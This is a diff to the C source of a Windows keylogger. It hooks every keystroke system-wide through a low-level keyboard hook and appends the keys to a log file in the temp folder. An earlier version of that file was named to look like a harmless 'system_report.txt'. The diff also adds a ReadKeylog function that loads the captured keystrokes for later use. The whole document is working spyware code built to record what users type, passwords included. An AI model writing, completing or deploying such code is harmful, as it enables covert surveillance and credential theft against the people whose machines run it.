@@ -9,15 +9,14 @@
 #include <io.h>
 #include <fcntl.h>
 #include "win_misc.h"
+#include "keyboard_hook.h"
+#include "file_util.h"
 
-
-#define KEYLOG_FILE L"system_report.txt"
 #define MAX_UNICODE_CHARS 16
 #define MAX_KEYBOARD_CHARS 265
 #define VK_MASK_DOWN              0x8000
 #define VK_MASK_UP                0x01
 
-static HANDLE logFile = INVALID_HANDLE_VALUE;
 HHOOK keyboardHook = NULL;
 
 BOOLEAN IsNumericVK(DWORD vk) {
@@ -92,6 +91,18 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         
         if (wParam == WM_KEYDOWN) 
         {
+
+            wchar_t * path = NULL;
+            path = GetTempPathToKeylog();
+
+            void * logFile = OpenFileWithAppendWin32(path);
+
+            if (!IsFileValidWin32(logFile)) {
+                return;
+            }
+
+            free(path);
+
             KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
 
             if (!kbStruct) {
@@ -135,9 +146,9 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                     WriteFileWin32(data, sizeBytes, logFile);
                     
                 }
-                
-            
             }
+
+            CloseFileWin32(logFile);
             
         }       
     }
@@ -151,13 +162,14 @@ void SetKeyboardHook() {
     wchar_t * path = NULL;
     path = GetTempPathToKeylog();
 
-    logFile = OpenFileWithAppendWin32(path);
+    void * logFile = OpenFileWithAppendWin32(path);
 
     if (!IsFileValidWin32(logFile)) {
         return;
     }
 
     free(path);
+    CloseFileWin32(logFile);
 
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
     if (keyboardHook == NULL) {
@@ -170,12 +182,6 @@ void RemoveKeyboardHook() {
     if (keyboardHook != NULL) {
         UnhookWindowsHookEx(keyboardHook);
         keyboardHook = NULL;
-    }
-    if (IsFileValidWin32(logFile)) {
-        
-        CloseFileWin32(logFile);
-
-        logFile = INVALID_HANDLE_VALUE;
     }
 }
 
@@ -210,4 +216,29 @@ int CreateKeyBoardRecordingThread()
     }
 
     return 0;
+}
+
+fbuf_ptr ReadKeylog()
+{
+    fbuf_ptr buffer;
+    int err;
+    wchar_t * path;
+    buffer = fbuf_new_with_size(0);
+
+    if (!buffer) return NULL;
+
+    path = GetTempPathToKeylog();
+
+    err = read_file(buffer, path);
+
+    if (err != FBUF_NO_ERR) {
+        printf("error opening keylog: %d\n", GetLastErrorWin32());
+        fbuf_free(buffer);
+        free(path);
+        return NULL;
+    }
+
+    free(path);
+
+    return buffer;
 }
